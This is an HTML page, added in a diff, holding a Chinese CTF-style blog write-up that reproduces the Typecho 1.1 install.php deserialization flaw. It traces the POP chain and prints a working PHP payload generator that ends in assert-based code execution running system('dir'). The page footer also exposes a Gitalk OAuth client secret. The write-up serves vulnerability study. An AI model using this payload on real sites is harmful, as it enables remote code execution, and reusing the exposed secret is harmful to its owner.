@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>typecho反序列化复现 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="typecho反序列化复现 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="typecho反序列化复现"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/PvC7m4Rig/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>typecho反序列化复现</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-06，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>之前在MRCTF还是WUST上有个typecho的反序列化来着。只做到了SSRF。现在来复现下</p>
+<!-- more -->
+<p>漏洞源码:<br>
+<code>https://codeload.github.com/typecho/typecho/zip/v1.1-15.5.12-beta</code><br>
+环境搭建就不多说了。。<br>
+已知漏洞点在install.php<br>
+开头有两个判断。不满足就会退出。<br>
+<img src="https://guokeya.github.io/post-images/1586171197639.png" alt="" loading="lazy"><br>
+需要GET一个finish并且带上相同IP的Referer<br>
+接下来看反序列化点<br>
+<img src="https://guokeya.github.io/post-images/1586171357152.png" alt="" loading="lazy"><br>
+有了反序列化点。就看POP链了<br>
+下面有一行</p>
+<pre><code>$db = new Typecho_Db($config['adapter'], $config['prefix']);
+</code></pre>
+<p>new了一个Typecho_Db类。进去看看<br>
+<img src="https://guokeya.github.io/post-images/1586171756483.png" alt="" loading="lazy"><br>
+可以触发__toString。。搜一下<br>
+<img src="https://guokeya.github.io/post-images/1586171919386.png" alt="" loading="lazy"><br>
+继续搜__get魔术方法<br>
+<img src="https://guokeya.github.io/post-images/1586172170156.png" alt="" loading="lazy"><br>
+跟进函数<br>
+<img src="https://guokeya.github.io/post-images/1586172339353.png" alt="" loading="lazy"><br>
+跟着思路写exp:</p>
+<pre><code>&lt;?php
+class Typecho_Request
+{
+    private $_filter=array(&quot;assert&quot;);
+    private $_params=[&quot;screenName&quot;=&gt;&quot;eval('system(\'dir\');exit();')&quot;];
+}
+class Typecho_Feed
+{
+    private $_type = 'RSS 2.0';
+    private $_items;
+    public function __construct()
+    {
+        $this-&gt;_items=array(array(&quot;author&quot;=&gt;new Typecho_Request()));
+
+    }
+}
+$config=array(&quot;adapter&quot;=&gt;new Typecho_Feed(),&quot;prefix&quot;=&gt;'123');
+echo base64_encode(serialize($config));
+?&gt;
+</code></pre>
+<p>这里我们分析下运行流程。首先我们反序列化。将每个类有用的值都改掉<br>
+然后原代码继续执行。new Typecho_Db类。它析构函数的两个值。分别是我们反序列化的adapter和prefix</p>
+<pre><code>$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
+$db = new Typecho_Db($config['adapter'], $config['prefix']);
+</code></pre>
+<p>所以我们得构造array(&quot;adapter&quot;=&gt;一个类,prefix=&gt;随便填)<br>
+继续进入db类。字符串拼接<br>
+我们得把adapter对应的值改为Typecho_Feed类<br>
+就构造成了array(&quot;adapter&quot;=&gt;new Typecho_Feed(),&quot;prefix&quot;=&gt;随便填)<br>
+然后进入Typecho_Feed类。触发tostring。有个判断<br>
+<img src="https://guokeya.github.io/post-images/1586173506985.png" alt="" loading="lazy"><br>
+所以。这类Typecho_Feed类的_type是RSS 2.0<br>
+继续执行。触发__get魔术方法<br>
+取<code>$this-&gt;items['author']</code>中screenName键对应的值<br>
+注意。<code>$this-&gt;items</code>是个数组。我们取得是items数组中的数组中的author。。。。说白了就是取二维数组中的author值<br>
+所以。这里将<code>$this-&gt;items</code>设置为<code>array(array('author'=&gt; new Typecho_Request()))</code><br>
+触发get魔术方法。进入Typecho_Request类</p>
+<pre><code>public function get($key,$default=NULL)
+这里就变成了get('screenName')
+下面会执行
+$value = $this-&gt;_params[$key];
+相当于$value=$this-&gt;_params['screenName']
+然后执行call_user_func($this-&gt;_filter, $value);
+</code></pre>
+<p>所以此处构造</p>
+<pre><code>class Typecho_Request
+{
+    private $_params = array('screenName'=&gt;'eval(\'phpinfo();\')');
+    private $_filter = array('assert');
+}
+</code></pre>
+<p>至此漏洞复现成功<br>
+<img src="https://guokeya.github.io/post-images/1586174667311.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/iG-_evz93/">
+              <span class="post-title">
+                [CISCN2019 总决赛 Day1 Web4]Laravel1(反序列化)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
